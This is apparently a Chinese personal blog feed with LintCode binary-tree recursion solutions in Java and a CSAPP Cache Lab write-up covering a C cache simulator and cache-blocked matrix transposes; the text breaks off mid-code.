<p>Divide and conquer做法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> Math.max(maxDepth(root.left), maxDepth(root.right)) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Example2-Binary-Tree-Paths"><a href="#Example2-Binary-Tree-Paths" class="headerlink" title="Example2: Binary Tree Paths"></a>Example2: Binary Tree Paths</h3><p>这题要求给定一个二叉树，返回所有root-to-leaf的路径。 首先分析一下递归的三要素</p>
<ol>
<li>递归的定义:  返回以root为根的所有root-to-leaf的路径(因为题目要求的返回值和我们需要的返回值都是<code>List&lt;String&gt;</code>所以不需要helper函数)</li>
<li>递归的拆解：计算以root.left和root.right为根的paths，将两个List合并，并在list的每一项之前加上<code>root.val + &quot;-&gt;&quot;</code></li>
<li>递归的拆解：root == null时候返回，注意对于root是叶子节点的时候因为左子树右子树返回的list都是空的，所以需要返回只包含一个字符串(<code>root.val</code>)的List</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">	List&lt;String&gt; results = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="keyword">null</span>) <span class="keyword">return</span> results;</span><br><span class="line">	<span class="keyword">if</span>(root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>)&#123;</span><br><span class="line">		results.add(<span class="string">""</span>+ root.val);</span><br><span class="line">		<span class="keyword">return</span> results;</span><br><span class="line">	&#125;</span><br><span class="line">	List&lt;String&gt; left = binaryTreePaths(root.left);</span><br><span class="line">	List&lt;String&gt; right = binaryTreePaths(root.right);</span><br><span class="line">	<span class="keyword">for</span>(String str: left)&#123;</span><br><span class="line">		results.add(root.val + <span class="string">"-&gt;"</span> + str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(String str: right)&#123;</span><br><span class="line">		results.add(root.val + <span class="string">"-&gt;"</span> + str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Example3-Minimum-Subtree"><a href="#Example3-Minimum-Subtree" class="headerlink" title="Example3: Minimum Subtree"></a>Example3: Minimum Subtree</h3><p><a href="http://www.lintcode.com/en/problem/minimum-subtree/" target="_blank" rel="noopener">最小子树</a> 这题要求我们找到和最小的子树</p>
<ol>
<li>递归的定义: 计算以root为根的树的和并返回</li>
<li>递归的拆解: 计算出左子树右子树的和之后，加上root的值就是以root为根的树的和</li>
<li>递归的出口：root==null的时候返回0</li>
</ol>
<p>在计算的过程中使用打擂台的方式，记录最小的子树和对应的root结点。另外这里因为我们的递归函数需要返回int类型而题目要求返回的是treeNode， 所以需要引入一个helper函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> minSum = Integer.MAX_VALUE;</span><br><span class="line"><span class="keyword">private</span> TreeNode subtree; </span><br><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">findSubtree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    helper(root);</span><br><span class="line">    <span class="keyword">return</span> subtree;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">helper</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> left = helper(root.left);</span><br><span class="line">    <span class="keyword">int</span> right = helper(root.right);</span><br><span class="line">    <span class="keyword">int</span> sum = left + right + root.val;</span><br><span class="line">    <span class="keyword">if</span>(sum &lt; minSum)&#123;</span><br><span class="line">        minSum = sum;</span><br><span class="line">        subtree = root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>LintCode上关于二叉树的题目: <a href="http://www.lintcode.com/en/tag/binary-tree/" target="_blank" rel="noopener">http://www.lintcode.com/en/tag/binary-tree/</a></p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
            <tag> NineChapter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP-Cache Lab]]></title>
      <url>/2018/02/27/CSAPP/Cache_Lab/</url>
      <content type="html"><![CDATA[<p>第四个实验Cache Lab主要帮助我们理解高速缓存cache对C语言程序性能的影响。实验分成两个部分，第一部分是实现一个cache simulator来模拟缓存的过程。第二部分是优化矩阵转置的操作</p>
<a id="more"></a>
<h1 id="Part-A-Cache-Simulator"><a href="#Part-A-Cache-Simulator" class="headerlink" title="Part A: Cache Simulator"></a>Part A: Cache Simulator</h1><p>这部分实验只要理解了cache的原理就不算难。其中需要我们注意的地方是</p>
<ol>
<li>使用getopt()函数来读取命令行参数</li>
<li>使用fgets函数读取文件内容(实验指导中写的要用fscanf函数，但是我使用的是fgets)</li>
<li>因为我们需要根据参数不同模拟不同大小的cache，所以要用malloc和free分配释放内存</li>
</ol>
<p>下面是整个程序实现过程中的几个关键部分</p>
<h2 id="Cache-line-结构体"><a href="#Cache-line-结构体" class="headerlink" title="Cache_line 结构体"></a>Cache_line 结构体</h2><p>因为cache的结构如下图所示，</p>
<p><img src="/images/CSAPP/cache.JPG" alt="cachelab"></p>
<p>所以我们在程序中设计了cache_line结构体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">	int valid;    // 有效位</span><br><span class="line">	int tag;      // 标识位</span><br><span class="line">	int lineNum;  // 使用lineNum来标记上次访问的时间</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里因为要求使用LRU(least-recently used)的原则来进行eviction替换，所以我偷了个懒，用lineNum即当前记录是第几条来标记上次访问的时间。</p>
<h2 id="initialCache"><a href="#initialCache" class="headerlink" title="initialCache"></a>initialCache</h2><p>这里我把cache定义成了全局变量，在输入s，E,b 三个参数值之后使用calloc把cache初始化出来。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cache = (cache_line*)<span class="built_in">calloc</span>((<span class="keyword">size_t</span>)<span class="built_in">pow</span>(<span class="number">2</span>, s) * E, <span class="keyword">sizeof</span>(cache_line));</span><br></pre></td></tr></table></figure></p>
<p>之后便可以这样访问cache: 第<code>set_index</code>组第<code>i</code>个<code>cache_line</code>即<code>cache[set_index * s + i]</code></p>
<p>calloc 和 malloc 的区别：</p>
<ol>
<li>malloc参数为size, 在内存的动态存储区(堆)中分配一块长度为”size” 字节的连续区域。calloc参数为n, size, 在内存动态存储区中分配n块长度为“size”字节的连续区域。</li>
<li>calloc返回的是一个数组，而malloc返回的是一个对象</li>
<li>malloc不会初始化分配的区域，而calloc会把分配的区域全部归零</li>
</ol>
<h2 id="分解address"><a href="#分解address" class="headerlink" title="分解address"></a>分解address</h2><p>拿到一个address之后，我们要根据地址来找到它属于哪个set，它的tag是什么。(因为这个不考虑访问时超过block 边界的情况，所以可以忽略offset）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> address = (<span class="keyword">int</span>)strtol(buf+<span class="number">3</span>, <span class="literal">NULL</span>, <span class="number">16</span>);  <span class="comment">// 按16进制的方式读取address</span></span><br><span class="line"><span class="keyword">int</span> tag = address &gt;&gt; (s + b);</span><br><span class="line"><span class="keyword">int</span> set_index = (address &gt;&gt; b) &amp; ( (<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>);</span><br><span class="line"><span class="comment">// int block_offset = address &amp; ((1 &lt;&lt; b) - 1);</span></span><br></pre></td></tr></table></figure></p>
<p>这里strtol函数把buf中的地址按16进制数读取出来，然后根据address分解出tag和set_index,分解的原则根据<br><img src="/images/CSAPP/address.JPG" alt="address"></p>
<h2 id="loadData"><a href="#loadData" class="headerlink" title="loadData"></a>loadData</h2><p>因为loadData和storeData实际效果是一样的，而modifyData其实就是先做一遍load再做一遍store，所以其实只用实现loadData即可。</p>
<p>在loadData函数中，我们要遍历cache的某个set之下所有的cache_line，查找是否存在<code>valid = 1</code> 且tag等于我们要读取的数据的tag的项。如果找到则是hit。 其余情况则是miss，miss也分为两种（cold miss &amp; conflict miss），一种是cache这个set尚未填满的情况，这种情况要把新的数据加载到set中。另一种情况是cache的set已经填满，需要找到least recently used的项目，把这一项替换为新的数据。</p>
<p>程序实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadData</span><span class="params">(<span class="keyword">char</span> * buf, <span class="keyword">int</span> tag, <span class="keyword">int</span> set_index, <span class="keyword">int</span> lineNum, <span class="keyword">int</span> verbose, <span class="keyword">int</span> modify)</span></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; E; i++)&#123;</span><br><span class="line">      <span class="keyword">int</span> index = (set_index) * E + i;</span><br><span class="line">      <span class="keyword">if</span>(cache[index].valid == <span class="number">0</span>)&#123;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(cache[index].tag == tag)&#123;</span><br><span class="line">            <span class="keyword">if</span>(modify == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(verbose == <span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s hit\n"</span>, buf);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(verbose == <span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%s hit hit\n"</span>, buf);</span><br><span class="line">                hit_count++;</span><br><span class="line">            &#125;</span><br><span class="line">         cache[index].time_stamp = lineNum;</span><br><span class="line">         hit_count++;</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 执行到这里说明没有hit 且i&lt;E说明该组还未存满</span></span><br><span class="line">  miss_count++;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; E)&#123;</span><br><span class="line">        <span class="keyword">int</span> index = (set_index) * E + i;</span><br><span class="line">        cache[index].valid = <span class="number">1</span>;</span><br><span class="line">        cache[index].time_stamp = lineNum;</span><br><span class="line">        cache[index].tag = tag;</span><br><span class="line">        <span class="keyword">if</span>(modify == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(verbose == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s miss\n"</span>, buf);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(verbose == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s miss hit\n"</span>, buf);</span><br><span class="line">            hit_count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        eviction_count++;</span><br><span class="line">        doEviction(tag, set_index, lineNum);</span><br><span class="line">        <span class="keyword">if</span>(modify == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(verbose == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s miss eviction\n"</span>, buf);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(verbose == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s miss eviction hit\n"</span>, buf);</span><br><span class="line">            hit_count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中verbose参数用来决定是否把miss hit等结果打印到屏幕上。这里modify标记这个过程是否为modify，修改数据其实相当于先调用了一次loadData，再调用一次storeData，而storeData的结果一定是hit。 所以这里对函数稍作修改使他满足了三个情况(M,L,S)</p>
<h2 id="doEviction"><a href="#doEviction" class="headerlink" title="doEviction"></a>doEviction</h2><p>这部分就是先找到最远使用过的cache_line，然后将它替换为新的数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doEviction</span><span class="params">(<span class="keyword">int</span> tag, <span class="keyword">int</span> set_index, <span class="keyword">int</span> lineNum)</span></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> minInd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> min = <span class="number">2147483647</span>;</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; E; i++)&#123;</span><br><span class="line">      <span class="keyword">int</span> index = (set_index) * E + i;</span><br><span class="line">      <span class="keyword">if</span>(min &gt; cache[index].time_stamp)&#123;</span><br><span class="line">         minInd = index;</span><br><span class="line">            min = cache[index].time_stamp;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(minInd &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">      cache[minInd].tag = tag;</span><br><span class="line">      cache[minInd].time_stamp = lineNum;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他还有些读取命令行参数，解析trace文件的部分Google一下就能找到解决方法。</p>
<h1 id="Part-B-Optimizing-Matrix-Transpose"><a href="#Part-B-Optimizing-Matrix-Transpose" class="headerlink" title="Part B: Optimizing Matrix Transpose"></a>Part B: Optimizing Matrix Transpose</h1><p>第二部分就是使用(Blocking)[<a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf]的方法来提高inner" target="_blank" rel="noopener">http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf]的方法来提高inner</a> loop的空间局部性，达到优化矩阵转置操作的目的。</p>
<p>缓存的指标有：</p>
<ol>
<li>s=5即32个set</li>
<li>E=1即directly mapped</li>
<li>b=5即每个cache_line的block size是32个字节，可以存放8个整数。</li>
</ol>
<p>则拿到地址后，后5bit是block_offset, 6-10bit是set_index，其余的是tag</p>
<h2 id="Version0"><a href="#Version0" class="headerlink" title="Version0"></a>Version0</h2><p>首先先用我们最常见的实现方式(程序中提供的方式)跑一下8 x 8的矩阵看看可以发现 A[0][0]存储在<code>0x00602100</code> 则它的set_index是0x01000 即8，所以数组A的第一行都存放在set_index为8的set中，因为每个行有8个整数，则恰好一个行占据1个set。B[0][0]地址为<code>0x00642100</code>，set_index位也是8，所以B的第一行同样映射在set_index=8的set中</p>
<p>所以可以找到一个规律是A[m][n] B[m][n]都映射到set_index = m + 8 的set中。 这也是实验指导书上为什么写道要格外注意对角线的元素，每次给B的对角元素赋值的时候都会触发一次miss eviction 因为A[m][m] 和B[m][m]会映射到同一个cache set </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line">L 602100,4 miss eviction   A[0][0] set_index: 8 A第一行全部在set_index=8中</span><br><span class="line">S 642100,4 miss eviction   B[0][0] set_index: 8</span><br><span class="line">L 602104,4 miss eviction   </span><br><span class="line">S 642120,4 miss            B[1][0] set_index: 9</span><br><span class="line">L 602108,4 hit             </span><br><span class="line">S 642140,4 miss eviction   B[2][0] set_index: 10</span><br><span class="line">L 60210c,4 hit             </span><br><span class="line">S 642160,4 miss            B[3][0] set_index: 11</span><br><span class="line">L 602110,4 hit </span><br><span class="line">S 642180,4 miss            B[4][0] set_index: 12</span><br><span class="line">L 602114,4 hit </span><br><span class="line">S 6421a0,4 miss            B[5][0] set_index: 13</span><br><span class="line">L 602118,4 hit </span><br><span class="line">S 6421c0,4 miss            B[6][0] set_index: 14</span><br><span class="line">L 60211c,4 hit </span><br><span class="line">S 6421e0,4 miss            B[7][0] set_index: 15  </span><br><span class="line">L 602120,4 miss eviction   A[1][0] set_index: 9</span><br><span class="line">S 642104,4 miss eviction   B[0][1] set_index: 8</span><br><span class="line">L 602124,4 hit </span><br><span class="line">S 642124,4 miss eviction   B[1][1] set_index: 9</span><br><span class="line">L 602128,4 miss eviction   A[1][2] set_index: 9</span><br><span class="line">S 642144,4 hit </span><br><span class="line">L 60212c,4 hit </span><br><span class="line">S 642164,4 hit </span><br><span class="line">L 602130,4 hit </span><br><span class="line">S 642184,4 hit </span><br><span class="line">L 602134,4 hit </span><br><span class="line">S 6421a4,4 hit </span><br><span class="line">L 602138,4 hit </span><br><span class="line">S 6421c4,4 hit </span><br><span class="line">L 60213c,4 hit </span><br><span class="line">S 6421e4,4 hit </span><br><span class="line">.........</span><br></pre></td></tr></table></figure>
<h2 id="Version1"><a href="#Version1" class="headerlink" title="Version1"></a>Version1</h2><p>version0中我们考虑了8 x 8矩阵的情况，下面考虑不是8 x 8的情况，拿32 x 32为例子，矩阵每一行有32个元素，需要占据4个set。 因为A[0][0]是<code>0x00602100</code>，则A[0][0-7]属于set 8，A[0][8-15]属于set9，A[0][16-23]属于set 10，A[0][24-31]属于set11。 这样就得到下面的表，每个数字代表对应位置元素所属于缓存的哪个set<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">....8....  ....9....  ...10....  ...11....</span><br><span class="line">...12....  ...13....  ...14....  ...15....</span><br><span class="line">...16....  ...17....  ...18....  ...19....</span><br><span class="line">...20....  ...21....  ...22....  ...23....</span><br><span class="line">...24....  ...25....  ...26....  ...27....</span><br><span class="line">...28....  ...29....  ...30....  ...31....</span><br><span class="line">....0....  ....1....  ....2....  ....3....</span><br><span class="line">....4....  ....5....  ....6....  ....7....</span><br><span class="line">....8....  ....9....  ...10....  ...11....</span><br></pre></td></tr></table></figure></p>
<p>可以看出第九行会和第一个冲突，所以当我们遍历A的第一行，去赋值给B的第一列的时候，每8个B就会出现一次冲突。 所以如果我们分成8*8的小块去处理，就会尽可能得利用缓存的特性（读取第一个的时候后面7个也会加载进来）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i, j, ii, jj;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i+=<span class="number">8</span>)&#123;</span><br><span class="line">	    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; M; j+=<span class="number">8</span>)&#123;</span><br><span class="line">	        <span class="keyword">for</span>(ii = i; ii &lt; i + <span class="number">8</span>; ii++) &#123;</span><br><span class="line">	            <span class="keyword">for</span> (jj = j; jj &lt; j + <span class="number">8</span>; jj++) &#123;</span><br><span class="line">	                B[jj][ii] = A[ii][jj];</span><br><span class="line">	            &#125;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到的结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           6.9         8         343</span><br><span class="line">Trans perf 64x64           0.0         8        4723</span><br><span class="line">Trans perf 61x67           0.0        10     invalid</span><br></pre></td></tr></table></figure></p>
<h2 id="Version2"><a href="#Version2" class="headerlink" title="Version2"></a>Version2</h2><p>Version1并没有处理对角线的问题，比如处理第4个8 x 8矩阵块的时候，A[1][0-7]属于缓存中的第12个set，而B[1][1]也属于set12，这样就造成了给B[1][1]赋值时是一次miss conflict, 紧接着load A[1][2]的时候又是一次miss conflict。 为了解决这一问题，我们可以先把小矩阵中A的一行全部读取出来存储到临时变量中(题目本身限制，只能引入 12 个局部变量)，再把这些变量依次赋值给B的一列。这样就避免了对角线元素的conflict miss。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i, j , tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;</span><br><span class="line">    <span class="keyword">int</span> n = N / <span class="number">8</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> m = M / <span class="number">8</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; m; j+=<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            tmp0 = A[i][j];</span><br><span class="line">            tmp1 = A[i][j+<span class="number">1</span>];</span><br><span class="line">            tmp2 = A[i][j+<span class="number">2</span>];</span><br><span class="line">            tmp3 = A[i][j+<span class="number">3</span>];</span><br><span class="line">            tmp4 = A[i][j+<span class="number">4</span>];</span><br><span class="line">            tmp5 = A[i][j+<span class="number">5</span>];</span><br><span class="line">            tmp6 = A[i][j+<span class="number">6</span>];</span><br><span class="line">            tmp7 = A[i][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">            B[j+<span class="number">1</span>][i] = tmp1;</span><br><span class="line">            B[j+<span class="number">2</span>][i] = tmp2;</span><br><span class="line">            B[j+<span class="number">3</span>][i] = tmp3;</span><br><span class="line">            B[j+<span class="number">4</span>][i] = tmp4;</span><br><span class="line">            B[j+<span class="number">5</span>][i] = tmp5;</span><br><span class="line">            B[j+<span class="number">6</span>][i] = tmp6;</span><br><span class="line">            B[j+<span class="number">7</span>][i] = tmp7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           8.0         8         287</span><br><span class="line">Trans perf 64x64           0.0         8        4611</span><br><span class="line">Trans perf 61x67           0.0        10     invalid</span><br><span class="line">          Total points    35.0        53</span><br></pre></td></tr></table></figure></p>
<h2 id="Version3"><a href="#Version3" class="headerlink" title="Version3"></a>Version3</h2><p>32x32的矩阵完成之后加入处理不是8nx8n这种类型的情况， 处理完最小的8nx8n的矩阵之后用普通的方法处理一下剩余部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 